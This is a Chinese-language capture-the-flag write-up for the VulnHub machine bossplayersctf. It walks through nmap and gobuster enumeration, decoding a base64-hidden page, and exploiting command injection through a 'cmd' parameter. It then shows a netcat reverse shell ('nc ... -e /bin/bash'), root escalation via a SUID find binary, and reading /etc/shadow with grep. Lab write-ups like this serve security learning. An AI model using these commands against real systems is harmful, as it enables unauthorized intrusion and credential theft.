# 靶机信息
bossplayersctf是vulnhub中的一台简单难度的CTF类型的靶机

# 信息收集
## NMAP扫描
```
└─$ nmap -sCV -p22,80 -O --min-rate 10000 192.168.218.212 -oA nmapScan/details
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-12 20:42 EST
Nmap scan report for 192.168.218.212 (192.168.218.212)
Host is up (0.00049s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
| ssh-hostkey: 
|   2048 ac:0d:1e:71:40:ef:6e:65:91:95:8d:1c:13:13:8e:3e (RSA)
|   256 24:9e:27:18:df:a4:78:3b:0d:11:8a:92:72:bd:05:8d (ECDSA)
|_  256 26:32:8d:73:89:05:29:43:8e:a1:13:ba:4f:83:53:f8 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:FA:C0:DB (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

后台挂个漏扫
`nmap --script=vuln --min-rate 10000 -p22,80 192.168.218.212 -oA nmapScan/vuln`

## 初始信息枚举

<img width="1919" height="969" alt="Image" src="https://github.com/user-attachments/assets/f27b0f62-7787-46e0-ae49-7ca23967379d" />

主页是靶机的基本信息

扫一下目录
```
└─$ gobuster dir -u http://192.168.218.212/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x html,php,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.218.212/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/logs.php             (Status: 200) [Size: 34093]
/index.html           (Status: 200) [Size: 575]
/robots.txt           (Status: 200) [Size: 53]
/server-status        (Status: 403) [Size: 303]
/index.html           (Status: 200) [Size: 575]
Progress: 224656 / 224660 (100.00%)
===============================================================
Finished
===============================================================
```

在使用dirsearch扫一遍也是这些
**robots.txt**中是一段话
>super secret password - bG9sIHRyeSBoYXJkZXIgYnJvCg==
解码
>lol try harder bro
看样子不是有用信息，

然后logs，看不懂给AI说是系统启动日志，没什么用，难道是URL有参数？fuzz了一下好像没有。

没思路了......

扒拉扒拉才发现漏掉了index中的源码

<img width="1919" height="964" alt="Image" src="https://github.com/user-attachments/assets/05de392d-fe55-4386-bc46-a805533f6a2a" />


有新发现<!--WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK-->
是一段很多次的base64编码，一直解码最后是 
```
└─$ echo 'WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK' | base64 -d | base64 -d | base64 -d
workinginprogress.php
```
没有爆出来的新目录，访问一下。

<img width="1919" height="967" alt="Image" src="https://github.com/user-attachments/assets/836cd36e-ae34-4995-9018-95046dd03d22" />

好像有命令注入，直接一下试出来了参数cmd，运气不错`http://192.168.218.212/workinginprogress.php?cmd=ls%20/`

不知道是不是没有bash，shell打不回来，但是有nc `nc 10.10.14.8 4444 -e /bin/bash`

# 提权
升级shell之后开始提权

提权倒是不难，简单审计一下就找了带suid的文件，参考这个 [网站](https://gtfobins.github.io/gtfobins/find/)

```
www-data@bossplayers:/tmp$ find . -exec /bin/sh -p \; -quit
# whoami
root
```

还有一个grep程序 `grep '' /etc/shadow`
可以看普通用户没权限的文件。不用grep继续试了。

# 反思
反思一下，靶机很简单，兔子洞藏得也不深，倒是我运气好cmd一下就试出来了，然后提权不难，找入口相较于提权难一点。
